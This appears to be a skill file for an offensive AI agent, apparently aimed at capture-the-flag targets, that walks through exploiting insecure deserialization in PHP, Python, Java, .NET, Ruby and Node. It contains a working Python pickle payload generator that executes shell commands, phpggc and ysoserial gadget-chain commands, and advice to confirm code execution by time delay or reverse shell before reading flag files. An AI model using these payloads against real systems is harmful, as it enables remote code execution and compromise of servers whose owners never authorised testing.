---
name: deserialization
when: the app deserializes untrusted data (PHP unserialize, Python pickle, Java, .NET, Ruby, Node)
tools: [http_request, python_exec, reverse_shell_listener]
phase: exploit
---
# Insecure deserialization

Identify the format from cookies/params/bodies:
- PHP: `O:4:"User":...` -> craft a POP chain via `__wakeup`/`__destruct` gadgets in the app's classes;
  `phpggc` builds chains for known frameworks: `phpggc Laravel/RCE1 system id`.
- Python pickle (base64 in a cookie/param): RCE is trivial -
  ```python
  import pickle, base64, os
  class E:
      def __reduce__(self): return (os.system, ('cat /flag* > /tmp/o; id',))
  print(base64.b64encode(pickle.dumps(E())).decode())
  ```
- Java (`rO0AB...` base64, or `AC ED 00 05` magic): use `ysoserial` gadget chains
  (`java -jar ysoserial.jar CommonsCollections6 'cmd' | base64`).
- .NET: `ysoserial.net`; Ruby: Marshal/`Oj` gadgets; Node: `node-serialize` `_$$ND_FUNC$$_`.
Confirm the sink executes (time delay or reverse shell), then run `cat /flag*`.
